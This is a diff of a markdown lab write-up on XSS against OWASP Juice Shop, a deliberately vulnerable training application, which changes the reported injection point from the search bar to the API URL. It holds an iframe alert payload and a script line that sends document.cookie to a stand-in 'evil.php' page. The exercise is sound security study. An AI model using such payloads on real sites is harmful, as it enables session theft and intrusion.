@@ -7,7 +7,7 @@
 ## Exploiting XSS Vulnerability
 
 1. **Identified Input Points:**
-   - Search bar on [https://pwning.owasp-juice.shop/part2/xss.html](https://pwning.owasp-juice.shop/part2/xss.html).
+   - Injected a payload in the url on the API
    - User profile fields, such as the bio.
 
 2. **Crafted Malicious Payloads:**
@@ -15,7 +15,7 @@
 
 3. **Injected Payloads:**
    - Injected payloads into the search bar and user profile bio.
-   - Search bar
+   - API
      <iframe src="javascript:alert('xss')"></iframe>
    - User Profile Bio in Username
     <SCRIPT type="text/javascript">
@@ -23,8 +23,8 @@ var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 </SCRIPT>
 
 4. **Observed Effects:**
-   - Search bar
-   - Payload executed successfully in the search bar, triggering an alert.
+   - API
+   - Payload executed successfully in the API, triggering an alert.
    - Output is : 
      XSS
 
@@ -32,7 +32,7 @@ var adr = '../evil.php?cakemonster=' + escape(document.cookie);
 
 5. **Captured Exploitation Process:**
    - Recorded step-by-step process of successful XSS execution.
-Click on the searchbar and insert the code: <iframe src="javascript:alert('xss')"></iframe>
+Click on the url and insert the code: <iframe src="javascript:alert('xss')"></iframe>
 This will prompt an alert with the output xss and a button with the words (OK) on it.
    - Documented unsuccessful attempts and error messages.
 
